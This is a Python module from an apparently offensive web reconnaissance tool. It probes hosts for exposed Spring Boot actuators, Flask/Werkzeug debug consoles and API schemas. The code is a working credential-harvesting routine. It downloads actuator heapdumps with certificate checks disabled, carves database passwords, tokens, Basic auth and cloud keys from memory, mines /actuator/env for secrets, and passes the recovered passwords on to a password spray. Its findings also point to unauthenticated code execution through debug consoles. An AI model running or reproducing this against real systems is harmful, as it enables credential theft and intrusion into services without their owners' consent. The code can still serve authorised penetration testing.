"""Debug consoles, framework management endpoints, and API schema exposure.

These are high-signal footholds that a plain path list under-serves because the
*value* is in the response body, not just the status:

  * Spring Boot Actuators (/actuator/env, /heapdump) leak DB creds + secrets.
  * Werkzeug/Flask debug console (/console) = unauthenticated RCE when the PIN
    is off.
  * Swagger/OpenAPI (/openapi.json, /swagger.json) enumerates API routes +
    params — fed straight to paramvoid.
  * .git exposure -> git-dumper the source.

Pure stdlib; runs as part of the web enrichment pass.
"""

from __future__ import annotations

import base64
import json
import os
import re
import ssl
import tempfile
import urllib.request
import concurrent.futures
from typing import Optional

from ...core import utils
from ...core.report import HostReport, Finding
from ...data import knowledge

# Credential shapes worth carving out of a Spring Boot heapdump (JDumpSpider
# style): JDBC URLs, password key=value pairs, HTTP Basic, JWTs, cloud keys.
# Heapdump strings are null/control-byte delimited, so value classes exclude
# \x00-\x1f (and quotes/brackets) to stop a match running across a boundary.
_V = r"[^\s\"'<>,;{}\x00-\x1f]"
_HEAP_PATS = [
    ("JDBC URL", re.compile(rf"jdbc:[a-z0-9]+://{_V}{{4,200}}", re.I)),
    ("password", re.compile(
        r"(?i)(?:password|passwd|pwd|spring\.datasource\.password|"
        r"spring\.mail\.password)[\"'=:]{1,3}(" + _V + r"{4,64})")),
    ("secret/token", re.compile(
        r"(?i)(?:secret|api[_-]?key|access[_-]?token|jwt[_-]?secret)"
        r"[\"'=:]{1,3}(" + _V + r"{8,80})")),
    ("HTTP Basic", re.compile(r"(?i)authorization:\s*basic\s+([A-Za-z0-9+/=]{8,})")),
    ("JWT", re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}")),
    ("AWS key", re.compile(r"AKIA[0-9A-Z]{16}")),
]
_HEAP_MAX = 400 * 1024 * 1024   # don't pull more than 400 MB

_ACTUATORS = ["actuator", "actuator/env", "actuator/health", "actuator/mappings",
              "actuator/configprops", "actuator/heapdump", "actuator/beans",
              "env", "trace", "actuator/httptrace"]
_API_DOCS = ["openapi.json", "swagger.json", "v2/api-docs", "v3/api-docs",
             "api/swagger.json", "swagger/v1/swagger.json", "api-docs",
             "graphql", "api/graphql", "v1/graphql"]
_DEBUG = ["console", "__debug__/", "_debug", "debug"]
_SECRET_KEYS = re.compile(
    r"(?i)(pass(word)?|secret|token|api[_-]?key|private[_-]?key|jdbc|"
    r"connection[_-]?string|aws_)", re.I)


def probe(host: HostReport, port: int, secure: bool, vhost: Optional[str] = None,
          fetch=None, opts=None) -> None:
    """*fetch* is http._fetch (injected to reuse the no-redirect opener)."""
    if fetch is None:
        from .http import _fetch as fetch
    scheme = "https" if secure else "http"
    base = f"{scheme}://{host.resolved_ip}:{port}"
    pfx = f"[{vhost}] " if vhost else ""

    def get(path):
        st, hd, body = fetch(f"{base}/{path}", timeout=6.0, method="GET", vhost=vhost)
        return path, st, hd, body

    targets = _ACTUATORS + _API_DOCS + _DEBUG
    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as pool:
        results = list(pool.map(get, targets))

    seen_actuator = host.__dict__.setdefault("_actuator_paths", set())
    for path, st, hd, body in results:
        if not st or st >= 400 or not body:
            continue
        low = body.lower()
        if path.startswith(("actuator", "env", "trace")):
            if not _looks_actuator(path, st, hd, body):
                continue
            # Collapse the same endpoint across ports / vhosts / http+https to
            # one finding — a Spring Boot app answers identically on all of them.
            if path in seen_actuator:
                continue
            seen_actuator.add(path)
            _actuator(host, port, path, base, body, pfx, vhost)
            if path == "actuator/heapdump":
                _loot_heapdump(host, f"{base}/{path}", vhost, port, pfx)
        elif path in _API_DOCS:
            _apidoc(host, port, path, base, body, low, pfx)
        elif path in _DEBUG and ("werkzeug" in low or "traceback" in low
                                 or "console" in low or "interactive" in low):
            utils.log("hot", f"debug console at /{path}", indent=2)
            host.add(Finding(
                title=f"{pfx}Debug console exposed: /{path}",
                detail=f"{base}/{path} looks like an interactive debugger "
                       "(Werkzeug/Flask). If the PIN is disabled this is "
                       "unauthenticated RCE — run Python in the console. Else "
                       "the PIN is derivable from server details (werkzeug "
                       "debugger PIN exploit).", severity="critical",
                category="web", port=port, service="http", evidence=f"{base}/{path}"))


def _looks_actuator(path, st, hd, body) -> bool:
    """A real Spring Boot actuator answers 200 with a recognisable JSON shape
    (or a binary heapdump). Rejects redirect pages / SPA index HTML that merely
    return a body, which was crowning every 301 an 'actuator'."""
    if st != 200:
        return False
    ct = (hd.get("content-type") or "").lower()
    head = body.lstrip()[:600].lower()
    if any(s in head for s in ("<html", "<!doctype", "moved permanently",
                               "301 ", "302 ", "<head", "<body")):
        return False
    if path == "actuator/heapdump":
        return ("octet-stream" in ct or "hprof" in head
                or (len(body) > 5000 and "<" not in body[:20]))
    if "json" not in ct and not head.startswith(("{", "[")):
        return False
    markers = {
        "actuator": ("_links", "actuator", "health"),
        "actuator/env": ("propertysources", "activeprofiles"),
        "env": ("propertysources", "activeprofiles"),
        "actuator/health": ('"status"',),
        "actuator/mappings": ("mappings", "dispatcherservlet", "contexts"),
        "actuator/beans": ("beans", "contexts"),
        "actuator/configprops": ("contexts", "beans", "properties"),
        "actuator/httptrace": ("traces",),
        "trace": ("traces", "timestamp", "\"method\""),
    }
    need = markers.get(path)
    low = body.lower()
    return any(mk in low for mk in need) if need else head.startswith(("{", "["))


def _actuator(host, port, path, base, body, pfx, vhost) -> None:
    url = f"{base}/{path}"
    if path in ("actuator", "actuator/mappings", "actuator/beans"):
        utils.log("good", f"Spring Boot actuator exposed: /{path}", indent=2)
        host.add(Finding(
            title=f"{pfx}Spring Boot actuator exposed: /{path}",
            detail=f"{url} — enumerate /actuator/env (creds), /actuator/heapdump "
                   "(memory dump -> creds/tokens), /actuator/mappings (routes).",
            severity="high", category="web", port=port, service="http",
            evidence=url))
        return
    # env/configprops/heapdump — mine for secrets.
    utils.log("hot", f"actuator data at /{path} — mining for secrets", indent=2)
    host.add(Finding(
        title=f"{pfx}Spring Boot {path} exposed (secrets likely)",
        detail=f"{url} leaks configuration. scryer extracts credential-shaped "
               "values below.", severity="high", category="leak", port=port,
        service="http", evidence=url))
    hits, seen = 0, set()
    # Spring env nests values as  "key":{"value":"X"} ; flat configs use
    # "key":"X". Match each key directly to its OWN value (no greedy gap, which
    # otherwise lets an outer key swallow a nested secret).
    pats = [r'"([^"]+)"\s*:\s*\{\s*"value"\s*:\s*"([^"]{1,200})"',
            r'"([^"]+)"\s*:\s*"([^"]{1,200})"']
    for pat in pats:
        for m in re.finditer(pat, body):
            key, val = m.group(1), m.group(2)
            if key.lower() in ("value",) or (key, val) in seen:
                continue
            if _SECRET_KEYS.search(key) and val and val.lower() not in ("null", "******", ""):
                seen.add((key, val))
                hits += 1
                if hits <= 15:
                    utils.log("hot", f"{key} = {val[:40]}", indent=3)
                host.add(Finding(
                    title=f"{pfx}Secret in /{path}: {key}",
                    detail=f"{key} = {val[:80]}", severity="high", category="cred",
                    port=port, service="http", evidence=f"{key}={val}"))
                host.add_cred(val)
    for _lbl, val, _sev in knowledge.extract_secrets(body):
        host.add_cred(val)


def _loot_heapdump(host, url, vhost, port, pfx) -> None:
    """Download the heapdump and carve credentials out of it — the actuator's
    biggest payoff (a live memory dump holds DB passwords, tokens, session
    cookies). Streamed to a temp file with a size cap, scanned in chunks."""
    utils.log("info", f"downloading heapdump {url} (may be large) — carving creds",
              indent=2)
    tmp = None
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={"User-Agent": "scryer"})
        if vhost:
            req.add_header("Host", vhost)
        with urllib.request.urlopen(req, timeout=30, context=ctx) as resp:
            tmp = tempfile.NamedTemporaryFile(prefix="scryer_heap_", delete=False)
            total = 0
            while total < _HEAP_MAX:
                chunk = resp.read(4 * 1024 * 1024)
                if not chunk:
                    break
                tmp.write(chunk)
                total += len(chunk)
            tmp.close()
    except Exception as exc:
        if tmp:
            _rm(tmp.name)
        utils.log("dim", f"heapdump download failed ({str(exc)[:60]}) — pull it "
                         f"manually: curl -sk {url} -o heap.hprof; then "
                         "JDumpSpider / strings", indent=3)
        return

    found = _carve_heapdump(tmp.name)
    _rm(tmp.name)
    if not found:
        utils.log("dim", "no credentials carved from heapdump — open it in "
                         "Eclipse MAT / JDumpSpider for a deeper look", indent=3)
        return
    for label, value in found:
        utils.log("hot", f"heapdump {label}: {value[:60]}", indent=3)
        host.add(Finding(
            title=f"{pfx}Credential in heapdump: {label}",
            detail=f"{value[:120]} (carved from /actuator/heapdump memory dump)",
            severity="critical", category="cred", port=port, service="http",
            evidence=value))
        host.add_cred(_password_part(value))


def _carve_heapdump(path):
    """Chunk-scan a (possibly huge) heapdump for credential-shaped strings."""
    found, seen = [], set()
    try:
        size = os.path.getsize(path)
    except OSError:
        return found
    with open(path, "rb") as fh:
        carry = b""
        read = 0
        while read < size:
            block = fh.read(4 * 1024 * 1024)
            if not block:
                break
            read += len(block)
            text = (carry + block).decode("latin-1", "replace")
            for label, pat in _HEAP_PATS:
                for m in pat.finditer(text):
                    val = (m.group(1) if m.groups() else m.group(0)).strip()
                    if label == "HTTP Basic":
                        try:
                            val = base64.b64decode(val).decode("latin-1")
                        except Exception:
                            continue
                    if not val or val in seen or _heap_junk(val):
                        continue
                    seen.add(val)
                    found.append((label, val))
                    if len(found) >= 60:
                        return found
            carry = block[-256:]      # overlap so a split match still lands
    return found


def _heap_junk(v: str) -> bool:
    if len(v) < 4:
        return True
    low = v.lower()
    if low in ("password", "null", "true", "false", "class", "string", "object"):
        return True
    # class/type names and getter/setter fragments, not secrets
    return v.startswith(("java.", "org.springframework", "com.", "sun.", "[")) \
        or v.endswith((";", "()", ".class"))


def _password_part(value: str) -> str:
    """For a jdbc/basic value, return just the password so it feeds the spray."""
    m = re.search(r"://[^:/@\s]+:([^@\s/]+)@", value)      # jdbc://user:pass@
    if m:
        return m.group(1)
    if ":" in value and value.count(":") == 1 and " " not in value:
        return value.split(":", 1)[1]                     # user:pass (basic)
    return value


def _rm(path: str) -> None:
    try:
        os.unlink(path)
    except OSError:
        pass


def _apidoc(host, port, path, base, body, low, pfx) -> None:
    url = f"{base}/{path}"
    if "graphql" in path:
        # Only interesting if introspection/GraphQL actually responds.
        if "__schema" in low or "graphql" in low or "\"data\"" in low or "errors" in low:
            utils.log("hot", f"GraphQL endpoint at /{path}", indent=2)
            host.add(Finding(
                title=f"{pfx}GraphQL endpoint: /{path}",
                detail=f"{url} — run an introspection query for the full schema:\n"
                       f"  clairvoyance {url}  (or a __schema query). Audit for "
                       "password/token/admin/flag fields.", severity="medium",
                category="web", port=port, service="http", confidence="potential",
                evidence=url))
        return
    # OpenAPI/Swagger JSON — pull out the routes + params.
    routes = set()
    try:
        spec = json.loads(body)
        for p in (spec.get("paths") or {}):
            routes.add(p)
    except Exception:
        routes = set(re.findall(r'"(/[A-Za-z0-9_/{}.-]{2,60})"\s*:', body))
    if not routes:
        return
    utils.log("hot", f"API schema at /{path}: {len(routes)} routes", indent=2)
    host.add(Finding(
        title=f"{pfx}API schema exposed: /{path} ({len(routes)} routes)",
        detail=f"{url}\nRoutes: " + ", ".join(sorted(routes)[:40])
               + "\nFeed these to paramvoid / test each for authz + injection.",
        severity="medium", category="web", port=port, service="http",
        evidence="\n".join(sorted(routes)[:120])))
